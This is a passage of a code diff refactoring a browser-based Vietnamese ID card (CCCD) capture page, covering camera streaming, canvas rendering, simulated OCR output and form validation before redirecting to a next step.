+                        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', ...this.config.cameraResolution } });
+                        facingMode = 'user';
+                    } else { throw err; }
                 }
-            });
-            this.state.currentStream = stream;
-            this.elements.cameraVideo.srcObject = stream;
-            
-            const trackSettings = stream.getVideoTracks()[0].getSettings();
-            this.state.currentFacingMode = trackSettings.facingMode || 'environment';
-
-            this.elements.cameraVideo.onloadedmetadata = () => {
+                this.elements.cameraVideo.srcObject = stream;
+                await new Promise(resolve => { this.elements.cameraVideo.onloadedmetadata = resolve; });
+                try { await this.elements.cameraVideo.play(); } 
+                catch (playErr) {
+                    this.stopCamera(); this.logError("Không thể phát luồng camera.", playErr, true);
+                    this.setState({ appStep: 'guide' }); return;
+                }
                 const video = this.elements.cameraVideo;
-                this.state.videoOrientation = video.videoHeight > video.videoWidth ? 90 : 0;
-                
-                this.state.cameraCanvasPreview.width = this.elements.cameraFrame.offsetWidth;
-                this.state.cameraCanvasPreview.height = this.elements.cameraFrame.offsetHeight;
-                
-                this.drawVideoToCanvas();
-                this.autoCaptureLoop();
-            };
-
-            await this.elements.cameraVideo.play();
-        } catch (err) {
-            console.error("Camera Error:", err);
-            let message = "Không thể truy cập camera.";
-            if (err.name === "NotAllowedError") {
-                message = "Bạn đã từ chối quyền truy cập camera. Vui lòng cấp quyền trong cài đặt trình duyệt.";
+                this.setState({
+                    isBusy: false, stream: stream, facingMode: facingMode,
+                    videoOrientation: video.videoHeight > video.videoWidth ? 90 : 0
+                });
+                this._runRenderLoop();
+                return;
+            } catch (err) {
+                if (attempts === 0) {
+                    this.stopCamera();
+                    this.logError("Không thể truy cập camera. Vui lòng kiểm tra quyền trong cài đặt trình duyệt.", err, true);
+                    this.setState({ appStep: 'guide' });
+                }
+                await new Promise(resolve => setTimeout(resolve, 500));
             }
-            this.showPermanentError(message);
         }
-    },
-
-    drawVideoToCanvas() {
-        if (!this.state.currentStream || !this.state.currentStream.active) {
-            if (this.state.animationFrameId) cancelAnimationFrame(this.state.animationFrameId);
-            return;
-        }
-        const { video, canvas, context, canvasWidth, canvasHeight, videoWidth, videoHeight } = {
-            video: this.elements.cameraVideo,
-            canvas: this.state.cameraCanvasPreview,
-            context: this.state.cameraCanvasContext,
-            canvasWidth: this.state.cameraCanvasPreview.width,
-            canvasHeight: this.state.cameraCanvasPreview.height,
-            videoWidth: this.elements.cameraVideo.videoWidth,
-            videoHeight: this.elements.cameraVideo.videoHeight
-        };
-        
-        context.save();
-        context.clearRect(0, 0, canvasWidth, canvasHeight);
-        let rotateAngle = this.state.videoOrientation === 90 ? Math.PI / 2 : 0;
-        let drawSourceWidth = rotateAngle === 0 ? videoWidth : videoHeight;
-        let drawSourceHeight = rotateAngle === 0 ? videoHeight : videoWidth;
-        let scaleX = (this.state.currentFacingMode === 'user' && this.config.mirrorFrontCamera) ? -1 : 1;
-        let scale = Math.max(canvasWidth / drawSourceWidth, canvasHeight / drawSourceHeight);
-        let scaledWidth = drawSourceWidth * scale;
-        let scaledHeight = drawSourceHeight * scale;
-
-        context.translate(canvasWidth / 2, canvasHeight / 2);
-        context.rotate(rotateAngle);
-        context.scale(scaleX, 1);
-        context.drawImage(video, -scaledWidth / 2, -scaledHeight / 2, scaledWidth, scaledHeight);
-        context.restore();
-
-        this.state.animationFrameId = requestAnimationFrame(() => this.drawVideoToCanvas());
     },
     
-    autoCaptureLoop() {
-        if (!this.state.currentStream || !this.state.currentStream.active) {
-            return;
-        }
-        const validation = this.simulateValidation();
-        this.elements.statusMessage.textContent = validation.message;
-
-        const isReady = validation.code === 'READY';
-        this.setCameraFrameReady(isReady);
-        this.elements.manualCaptureBtn.disabled = !isReady;
-        
-        this.state.guidanceLoopTimeoutId = setTimeout(() => this.autoCaptureLoop(), 700);
+    stopCamera() {
+        if (this.state.stream && this.state.stream.active) this.state.stream.getTracks().forEach(track => track.stop());
+        if (this.state.animationFrameId) cancelAnimationFrame(this.state.animationFrameId);
+        this.setState({ stream: null, animationFrameId: null });
     },
 
     triggerCapture() {
-        if (this.state.isCapturing) return;
-
-        this.stopAutoCapture();
-        this.state.isCapturing = true;
-
-        this.toggleUIState('loading');
+        if (this.state.isBusy) return;
+        const canvas = this.elements.cameraCanvasPreview;
+        if (canvas.width === 0 || canvas.height === 0) { this.logError("Không thể chụp ảnh do canvas không hợp lệ."); return; }
+        this.setState({ isBusy: true });
         this.elements.cameraFrame.classList.add('blink-once');
         setTimeout(() => this.elements.cameraFrame.classList.remove('blink-once'), 500);
-        this.handleImageVerification();
+        this._triggerHapticFeedback();
+        const imageDataUrl = canvas.toDataURL('image/jpeg', 0.9);
+        if (!imageDataUrl || !imageDataUrl.startsWith('data:image/jpeg')) {
+            this.logError("Không thể tạo ảnh từ canvas."); this.setState({ isBusy: false }); return;
+        }
+        const { captureType, imageData } = this.state;
+        this.stopCamera();
+        this.setState({ imageData: { ...imageData, [captureType]: imageDataUrl }, appStep: 'capture_review', isBusy: false });
     },
 
-    async handleImageVerification() {
-        if (!this.state.currentStream) {
-            this.showError("Lỗi: Luồng camera không hoạt động.");
-            this.toggleUIState('error');
-            this.state.isCapturing = false;
+    confirmAndProceed() {
+        if (this.state.captureType === 'front') this.startCaptureProcess('back');
+        else this.setState({ extractedInfo: this._simulateOCR(), appStep: 'confirm' });
+    },
+    
+    _updateUI() {
+        const { isBusy, appStep, captureType, imageData, error, stream, isPermanentError } = this.state;
+        if(this.elements.confirmBtn) this.elements.confirmBtn.classList.toggle('is-loading', isBusy && appStep === 'confirm');
+        
+        document.querySelectorAll('button').forEach(btn => btn.disabled = isBusy);
+        this.elements.guideSection.classList.toggle('hidden', appStep !== 'guide');
+        this.elements.captureSection.classList.toggle('hidden', !appStep.startsWith('capture'));
+        this.elements.confirmSection.classList.toggle('hidden', appStep !== 'confirm');
+        if (this.elements.backButton) this.elements.backButton.classList.toggle('hidden', appStep === 'guide' || appStep === 'confirm');
+
+        const frontDone = !!imageData.front, backDone = !!imageData.back;
+        if (this.elements.step1) this.elements.step1.classList.toggle('completed', frontDone);
+        if (this.elements.step2) this.elements.step2.classList.toggle('completed', backDone);
+        if (this.elements.step1) this.elements.step1.classList.toggle('active', appStep.startsWith('capture') && captureType === 'front');
+        if (this.elements.step2) this.elements.step2.classList.toggle('active', appStep.startsWith('capture') && captureType === 'back');
+        if (this.elements.progressBarFill) this.elements.progressBarFill.style.width = backDone ? '100%' : (frontDone ? '50%' : '0%');
+        
+        if (appStep.startsWith('capture')) {
+            this._updateCanvasSize();
+            this.elements.captureSection.dataset.state = isBusy ? 'loading' : appStep;
+            if (this.elements.captureTitle) this.elements.captureTitle.textContent = captureType === 'front' ? "Chụp mặt trước CCCD" : "Chụp mặt sau CCCD";
+            if (this.elements.captureInstruction) this.elements.captureInstruction.textContent = appStep === 'capture_streaming' ? "Căn chỉnh giấy tờ và nhấn nút Chụp ảnh." : "Kiểm tra ảnh vừa chụp.";
+            if (this.elements.statusMessage) this.elements.statusMessage.textContent = isBusy ? "Đang xử lý..." : appStep === 'capture_streaming' ? "Sẵn sàng chụp." : "Ảnh đã được chụp.";
+            
+            if (this.state.previewImage) { this.state.previewImage.onload = null; this.state.previewImage.onerror = null; this.state.previewImage.src = ''; }
+            if (appStep === 'capture_review') {
+                if (this.elements.nextStepBtn) this.elements.nextStepBtn.textContent = captureType === 'front' ? 'Tiếp tục: Chụp mặt sau' : 'Hoàn tất & Xem lại';
+                const canvas = this.elements.cameraCanvasPreview, ctx = canvas && canvas.getContext('2d');
+                if (!ctx) { this.logError("Không thể truy cập context canvas."); return; }
+                if (imageData[captureType]) {
+                    const img = new Image();
+                    img.onload = () => { this._updateCanvasSize(); ctx.drawImage(img, 0, 0, canvas.width, canvas.height); };
+                    img.onerror = () => this.logError("Không thể tải ảnh xem trước.");
+                    img.src = imageData[captureType];
+                    this.state.previewImage = img;
+                } else { this.logError("Không có ảnh để xem trước."); }
+            }
+        }
+        
+        if (appStep === 'confirm') {
+            this.elements.frontPreview.src = imageData.front; this.elements.backPreview.src = imageData.back;
+            Object.entries(this.state.extractedInfo || {}).forEach(([key, value]) => {
+                const elId = 'ocr' + key.charAt(0).toUpperCase() + key.slice(1);
+                if (this.elements[elId]) this.elements[elId].textContent = value;
+            });
+            if (this.elements.confirmBtn) this.elements.confirmBtn.disabled = !frontDone || !backDone || isBusy;
+        }
+        
+        const errorEl = this.elements.mainErrorMessage;
+        if (error && errorEl) {
+            errorEl.textContent = error; errorEl.classList.add('visible');
+            if (isPermanentError) { errorEl.style.opacity = '1'; if(this.elements.startCaptureBtn) this.elements.startCaptureBtn.classList.add('hidden'); } 
+            else { setTimeout(() => { if (this.state.error === error) this.setState({ error: null }); }, this.config.ERROR_MESSAGE_TIMEOUT); }
+        } else if(errorEl) { errorEl.textContent = ''; errorEl.classList.remove('visible'); }
+    },
+    
+    _runRenderLoop() {
+        if (!this.state.stream || !this.elements.cameraVideo.videoWidth) {
+            if (this.state.animationFrameId) cancelAnimationFrame(this.state.animationFrameId);
             return;
         }
-
-        const imageDataUrl = this.state.cameraCanvasPreview.toDataURL('image/jpeg', 0.9);
-        const { isValid, message } = this.simulateValidationAfterCapture(); 
-        
-        await new Promise(resolve => setTimeout(resolve, 1000));
-
-        if (isValid) {
-            this.handleVerificationSuccess(imageDataUrl);
-        } else {
-            this.handleVerificationFailure(message);
+        const video = this.elements.cameraVideo, canvas = this.elements.cameraCanvasPreview, context = canvas.getContext('2d');
+        if (!context) { this.logError("Không thể truy cập context canvas."); return; }
+        const frameWidth = this.elements.cameraFrame.offsetWidth, frameHeight = this.elements.cameraFrame.offsetHeight;
+        if (canvas.width !== frameWidth || canvas.height !== frameHeight) {
+            canvas.width = frameWidth; canvas.height = frameHeight;
         }
-        
-        this.state.isCapturing = false;
-        if (!isValid) {
-            this.autoCaptureLoop(); 
-        }
-    },
-    
-    simulateValidation() {
-        const randomFactor = Math.random();
-        if (!this.elements.cameraFrame.classList.contains('ready-to-capture') && randomFactor > 0.5) {
-            return { code: 'NO_CARD', message: "Hãy đưa giấy tờ vào trong khung hình..." };
-        }
-        if (randomFactor < 0.2) {
-             return { code: 'BLURRY', message: "Ảnh bị mờ, vui lòng giữ máy ổn định." };
-        }
-        if (randomFactor > 0.8) {
-             return { code: 'GLARE', message: "Ảnh bị lóa sáng, vui lòng tránh ánh đèn." };
-        }
-        return { code: 'READY', message: "Rất tốt! Nhấn nút để chụp ảnh." };
+        context.clearRect(0, 0, canvas.width, canvas.height); context.save();
+        context.translate(canvas.width / 2, canvas.height / 2);
+        context.rotate(this.state.videoOrientation * (Math.PI / 180));
+        if (this.state.facingMode === 'user') context.scale(-1, 1);
+        const logicalWidth = this.state.videoOrientation === 90 ? video.videoHeight : video.videoWidth;
+        const logicalHeight = this.state.videoOrientation === 90 ? video.videoWidth : video.videoHeight;
+        const scale = Math.max(canvas.width / logicalWidth, canvas.height / logicalHeight);
+        context.drawImage(video, -video.videoWidth*scale / 2, -video.videoHeight*scale / 2, video.videoWidth * scale, video.videoHeight*scale);
+        context.restore();
+        this.state.animationFrameId = requestAnimationFrame(() => this._runRenderLoop());
     },
 
-    simulateValidationAfterCapture() {
-        this.state.simulationAttempts++;
-        const testCase = this.state.simulationAttempts % 4;
-        switch (testCase) {
-            case 0: return { isValid: true, message: "Tải ảnh thành công!" }; 
-            case 1: return { isValid: false, message: "Ảnh không phải là CCCD/CMND. Vui lòng chụp lại." };
-            case 2: return { isValid: false, message: "Ảnh CCCD bị mờ. Vui lòng chụp lại rõ nét hơn." };
-            case 3: return { isValid: false, message: "Ảnh CCCD bị lóa sáng. Vui lòng chụp lại." };
-            default: return { isValid: true, message: "Tải ảnh thành công!" };
+    _updateCanvasSize() {
+        const canvas = this.elements.cameraCanvasPreview;
+        if (canvas && this.elements.cameraFrame) {
+            canvas.width = this.elements.cameraFrame.offsetWidth;
+            canvas.height = this.elements.cameraFrame.offsetHeight;
         }
     },
 
-    handleVerificationSuccess(imageDataUrl) {
-        this.stopCamera();
-        const type = this.state.currentCaptureType;
-        if (type === 'front') {
-            this.state.frontImageDataUrl = imageDataUrl;
-            this.state.frontImageVerified = true;
-            this.updateProgress(1, true);
-        } else {
-            this.state.backImageDataUrl = imageDataUrl;
-            this.state.backImageVerified = true;
-            this.updateProgress(2, true);
-        }
-        
-        if (this.state.frontImageVerified && this.state.backImageVerified) {
-            this.state.extractedInfo = this.simulateOCR();
-        }
-        this.triggerHapticFeedback(); 
-        this.toggleUIState('success');
-        this.updateFinalButtonState();
-    },
+    _simulateOCR: () => ({ cccdNumber: `0${Math.floor(1e11+9e11*Math.random())}`, fullName: "NGUYEN VAN A", dateOfBirth: "01/01/1990", gender: "Nam", address: "TP. Hồ Chí Minh" }),
 
-    simulateOCR() {
-        const randomId = Math.floor(100000000000 + Math.random() * 900000000000);
-        return {
-            cccdNumber: `0${String(randomId).slice(1)}`,
-            fullName: "NGUYEN VAN A",
-            dateOfBirth: "01/01/1990",
-            gender: "Nam",
-            address: "TP. Hồ Chí Minh, Việt Nam"
-        };
-    },
-
-    handleVerificationFailure(message) {
-        this.elements.statusMessage.textContent = message; 
-        this.showError(message, true); 
-        this.toggleUIState('error'); 
-    },
-    
-    updateProgress(step, isComplete = false) {
-        if (step === 0) {
-            ['step1', 'step2'].forEach(s => this.elements[s].classList.remove('active', 'completed'));
-            this.elements.progressBarFill.style.width = '0%';
-        } else if (step === 1) {
-            this.elements.step1.classList.add('active');
-            this.elements.step2.classList.remove('active', 'completed');
-            this.elements.progressBarFill.style.width = isComplete ? '50%' : '0%';
-            if(isComplete) this.elements.step1.classList.add('completed');
-        } else if (step === 2) {
-            this.elements.step1.classList.add('active', 'completed');
-            this.elements.step2.classList.add('active');
-            this.elements.progressBarFill.style.width = isComplete ? '100%' : '50%';
-            if(isComplete) this.elements.step2.classList.add('completed');
-        }
-    },
-
-    stopCamera() {
-        if (this.state.currentStream) {
-            this.state.currentStream.getTracks().forEach(track => track.stop());
-            this.state.currentStream = null;
-        }
-        this.stopAutoCapture();
-        if (this.state.animationFrameId) {
-            cancelAnimationFrame(this.state.animationFrameId);
-            this.state.animationFrameId = null;
-        }
-        if (this.state.cameraCanvasContext) {
-            this.state.cameraCanvasContext.clearRect(0, 0, this.state.cameraCanvasPreview.width, this.state.cameraCanvasPreview.height);
-        }
-    },
-
-    stopAutoCapture() {
-        if (this.state.guidanceLoopTimeoutId) {
-            clearTimeout(this.state.guidanceLoopTimeoutId);
-            this.state.guidanceLoopTimeoutId = null;
-        }
-    },
-
-    showError(message, autoHide = false) {
-        this.elements.errorMessage.textContent = message || '';
-        this.elements.errorMessage.classList.add('visible');
-        if (autoHide) {
-            setTimeout(() => this.elements.errorMessage.classList.remove('visible'), this.config.ERROR_MESSAGE_TIMEOUT);
-        }
-    },
-    
-    showPermanentError(message) {
-        this.elements.guideSection.innerHTML = `
-            <div class="error-message visible" style="margin-bottom: 20px;">${message}</div>
-            <div class="button-group"><button onclick="window.location.reload()" class="btn btn-primary">Tải lại trang</button></div>`;
-    },
-
-    updateFinalButtonState() {
-        const enabled = this.state.frontImageVerified && this.state.backImageVerified;
-        this.elements.finalContinueBtn.disabled = !enabled;
-        this.elements.bottomBar.classList.toggle('hidden', !enabled);
-    },
-    
-    showConfirmationScreen() {
-        this.stopCamera();
-        this.elements.captureSection.classList.add('hidden');
-        this.elements.bottomBar.classList.add('hidden');
-        this.elements.backButton.classList.add('hidden');
-        this.elements.confirmSection.classList.remove('hidden');
-        this.elements.frontPreview.src = this.state.frontImageDataUrl;
-        this.elements.backPreview.src = this.state.backImageDataUrl;
-        Object.keys(this.state.extractedInfo).forEach(key => {
-            const elementId = 'ocr' + key.charAt(0).toUpperCase() + key.slice(1);
-            if(this.elements[elementId]) {
-                this.elements[elementId].textContent = this.state.extractedInfo[key];
-            }
-        });
-    },
-
-    async submitFinalData() {
-        this.elements.confirmBtn.classList.add('is-loading'); 
-        const finalData = {
-            frontImage: this.state.frontImageDataUrl,
-            backImage: this.state.backImageDataUrl,
-            ocrData: Object.fromEntries(Object.keys(this.state.extractedInfo).map(key => {
-                const elementId = 'ocr' + key.charAt(0).toUpperCase() + key.slice(1);
-                return [key, this.elements[elementId] ? this.elements[elementId].textContent : ''];
-            }))
-        };
-        console.log("Data to be submitted:", finalData);
-        try {
-            await new Promise(resolve => setTimeout(resolve, 1500));
-            window.location.href = this.config.NEXT_STEP_URL;
-        } catch (err) {
-            this.showError("Lỗi khi gửi dữ liệu.");
-            this.elements.confirmBtn.classList.remove('is-loading'); 
-        }
-    },
-    
-    retakePhoto(type) {
-        this.elements.confirmSection.classList.add('hidden');
-        if (type === 'front') {
-            this.state.frontImageVerified = false;
-            this.state.frontImageDataUrl = null;
-        } else {
-            this.state.backImageVerified = false;
-            this.state.backImageDataUrl = null;
-        }
-        this.updateFinalButtonState();
-        this.startCaptureProcess(type);
-    },
-
-    cancelCapture(isFullReset = false) {
-        this.stopCamera();
-        this.elements.captureSection.classList.add('hidden');
-        this.elements.confirmSection.classList.add('hidden');
-        this.elements.guideSection.classList.remove('hidden');
-        this.elements.bottomBar.classList.add('hidden');
-        this.elements.backButton.classList.add('hidden');
-        this.updateProgress(0); 
-        this.state.frontImageVerified = false;
-        this.state.backImageVerified = false;
-        this.state.extractedInfo = {};
-        if (isFullReset) { 
-            this.state.frontImageDataUrl = null;
-            this.state.backImageDataUrl = null;
-        }
-        this.elements.finalContinueBtn.disabled = true;
-        this.setCameraFrameReady(false);
-    },
-
-    resetUIForCapture(type) {
-        this.elements.guideSection.classList.add('hidden');
-        this.elements.confirmSection.classList.add('hidden');
-        this.elements.captureSection.classList.remove('hidden');
-        this.elements.backButton.classList.remove('hidden');
-        this.elements.captureSection.className = 'capture-type-' + type;
-        this.elements.captureTitle.textContent = type === 'front' ? "Chụp mặt trước CCCD/CMND" : "Chụp mặt sau CCCD/CMND";
-        this.elements.captureInstruction.textContent = "Vui lòng đặt CCCD/CMND vào khung hình.";
-        this.updateProgress(type === 'front' ? 1 : 2);
-        this.toggleUIState('capturing'); 
-        this.setCameraFrameReady(false);
-        this.elements.manualCaptureBtn.disabled = true;
-    },
-
-    setCameraFrameReady(isReady) {
-        this.elements.cameraFrame.classList.toggle('ready-to-capture', isReady);
-    },
-
-    triggerHapticFeedback() {
+    _triggerHapticFeedback() {
         if ("vibrate" in navigator) navigator.vibrate(50); 
+        else { document.body.classList.add('feedback-flash'); setTimeout(() => document.body.classList.remove('feedback-flash'), 300); }
     },
     
-    toggleUIState(state) {
-        this.elements.captureSection.dataset.state = state;
-        this.elements.errorMessage.classList.remove('visible'); 
-        if (state === 'capturing') {
-            this.elements.statusMessage.textContent = "Đang tìm kiếm giấy tờ...";
-        } else if (state === 'loading') {
-            this.elements.statusMessage.textContent = "Đang phân tích hình ảnh...";
-        } else if (state === 'success') {
-            this.elements.statusMessage.textContent = `Đã lưu mặt ${this.state.currentCaptureType}.`;
+    cleanupAndReset() {
+        this.stopCamera();
+        this.setState({ appStep: 'guide', error: null, isPermanentError: false, imageData: { front: null, back: null }, extractedInfo: null });
+        ['cccdError', 'dobError', 'fullNameError', 'genderError'].forEach(id => { const el = document.getElementById(id); if (el) el.textContent = ''; });
+        if (this.state.previewImage) {
+            this.state.previewImage.onload = null; this.state.previewImage.onerror = null;
+            this.state.previewImage.src = ''; this.state.previewImage = null;
         }
-    }
+        const canvas = this.elements.cameraCanvasPreview;
+        if (canvas) canvas.getContext('2d').clearRect(0, 0, canvas.width, canvas.height);
+    },
+    
+    _addEventListeners() {
+        this.handlers = {
+            startCaptureBtn: () => this.startCaptureProcess('front'),
+            manualCaptureBtn: () => this.triggerCapture(),
+            recaptureBtn: () => this.startCaptureProcess(this.state.captureType),
+            nextStepBtn: () => this.confirmAndProceed(),
+            backButton: () => this.cleanupAndReset(),
+            redoAllBtn: () => this.cleanupAndReset(),
+            confirmBtn: async () => {
+                const updatedOcr = {}; let isValid = true;
+                Object.keys(this._simulateOCR()).forEach(key => {
+                    const elId = 'ocr' + key.charAt(0).toUpperCase() + key.slice(1);
+                    if (this.elements[elId]) { updatedOcr[key] = this.elements[elId].textContent.trim(); this.elements[elId].style.borderColor = 'var(--border-color)'; }
+                });
+                const errorElements = { cccdError: 'cccdError', dobError: 'dobError', fullNameError: 'fullNameError', genderError: 'genderError' };
+                Object.values(errorElements).forEach(id => { const el = document.getElementById(id); if(el) el.textContent = ''; });
+                if (updatedOcr.cccdNumber && !/^\d{12}$/.test(updatedOcr.cccdNumber)) { document.getElementById(errorElements.cccdError).textContent = "Số CCCD phải có 12 chữ số."; isValid = false; }
+                if (updatedOcr.dateOfBirth && !/^\d{2}\/\d{2}\/\d{4}$/.test(updatedOcr.dateOfBirth)) { document.getElementById(errorElements.dobError).textContent = "Định dạng ngày sinh là DD/MM/YYYY."; isValid = false; }
+                if (!updatedOcr.fullName || !/^[a-zA-Z\sÀ-ỹ]+$/.test(updatedOcr.fullName)) { document.getElementById(errorElements.fullNameError).textContent = "Họ tên không hợp lệ."; this.elements.ocrFullName.style.borderColor = 'var(--error-color)'; isValid = false; }
+                if (!updatedOcr.gender || !/^(Nam|Nữ)$/i.test(updatedOcr.gender)) { document.getElementById(errorElements.genderError).textContent = "Giới tính là 'Nam' hoặc 'Nữ'."; this.elements.ocrGender.style.borderColor = 'var(--error-color)'; isValid = false; }
+                
+                if (!isValid) {
+                    setTimeout(() => {
+                        Object.values(errorElements).forEach(id => { const el = document.getElementById(id); if(el) el.textContent = ''; });
+                        ['ocrFullName', 'ocrGender'].forEach(id => { if (this.elements[id]) this.elements[id].style.borderColor = 'var(--border-color)'; });
+                    }, this.config.ERROR_MESSAGE_TIMEOUT);
+                    return;
+                }
+                this.setState({ isBusy: true });
+                await new Promise(r => setTimeout(r, 1500));
+                console.log("Final Data:", { imageData: this.state.imageData, ocrData: updatedOcr });
+                window.location.href = this.config.NEXT_STEP_URL;
+            }
+        };
+        Object.entries(this.handlers).forEach(([id, handler]) => {
+            if (this.elements[id]) { this.elements[id].__handler = handler.bind(this); this.elements[id].addEventListener('click', this.elements[id].__handler); }
+        });
+        this.state.boundResizeHandler = () => this._updateCanvasSize();
+        this.state.boundPopstateHandler = () => { if (this.state.appStep !== 'guide') this.cleanupAndReset(); };
+        window.addEventListener('resize', this.state.boundResizeHandler);
+        window.addEventListener('popstate', this.state.boundPopstateHandler);
+    },
+
+    cleanup() {
+        this.stopCamera();
+        Object.values(this.elements).forEach(el => { if (el && el.__handler) el.removeEventListener('click', el.__handler); });
+        if (this.state.boundResizeHandler) window.removeEventListener('resize', this.state.boundResizeHandler);
+        if (this.state.boundPopstateHandler) window.removeEventListener('popstate', this.state.boundPopstateHandler);
+    },
+    
+    _cacheDOMElements() {
+        const ids=["guideSection","captureSection","startCaptureBtn","cameraView","cameraFrame","cameraVideo","statusMessage","loader","errorMessage","manualCaptureBtn","recaptureBtn","nextStepBtn","captureTitle","captureInstruction","backButton","confirmSection","frontPreview","backPreview","redoAllBtn","confirmBtn","cameraCanvasPreview","ocrCccdNumber","ocrFullName","ocrDateOfBirth","ocrGender","ocrAddress", "mainErrorMessage", "step1", "step2", "progressBarFill"];
+        ids.forEach(id => { if(document.getElementById(id)) this.elements[id] = document.getElementById(id) });
+    },
 };
 
-document.addEventListener('DOMContentLoaded', () => {
-    IDCaptureApp.init();
-});
+document.addEventListener('DOMContentLoaded', () => IDCaptureApp.init());
 </script>
-
 </body>
 </html>
